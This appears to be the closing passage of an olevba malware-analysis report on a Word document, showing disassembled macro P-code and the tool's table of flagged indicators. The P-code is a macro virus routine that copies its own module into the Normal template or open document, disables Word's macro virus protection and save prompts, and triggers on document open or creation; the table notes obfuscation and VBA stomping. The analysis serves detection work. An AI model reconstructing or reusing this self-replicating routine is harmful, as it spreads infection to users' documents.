' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bst 
' Line #198:
' 	LitDI2 0x0001 
' 	St KK 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	Ld bo2 
' 	Ld cora 
' 	Ne 
' 	IfBlock 
' Line #201:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bst 
' Line #202:
' 	LitDI2 0x0001 
' 	St KK 
' Line #203:
' 	EndIfBlock 
' Line #204:
' 	Ld KK 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #205:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St bol 
' Line #206:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bol 
' 	For 
' Line #207:
' 	Ld bi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld bi 
' 	ArgsSt bas 0x0001 
' Line #208:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	NextVar 
' Line #209:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bol 
' 	For 
' Line #210:
' 	Ld bi 
' 	Ld bi 
' 	ArgsLd bas 0x0001 
' 	Ld bst 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #211:
' 	StartForVariable 
' 	Ld bi 
' 	EndForVariable 
' 	NextVar 
' Line #212:
' 	EndIfBlock 
' Line #213:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #214:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #215:
' 	EndSub 
' Line #216:
' Line #217:
' 	FuncDefn (Private Sub Document_New())
' Line #218:
' 	ArgsCall maina 0x0000 
' Line #219:
' 	EndSub 
' Line #220:
' Line #221:
' 	FuncDefn (Private Sub Document_Open())
' Line #222:
' 	ArgsCall asder 0x0000 
' Line #223:
' 	ArgsCall maina 0x0000 
' Line #224:
' 	EndSub 
' Line #225:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #226:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

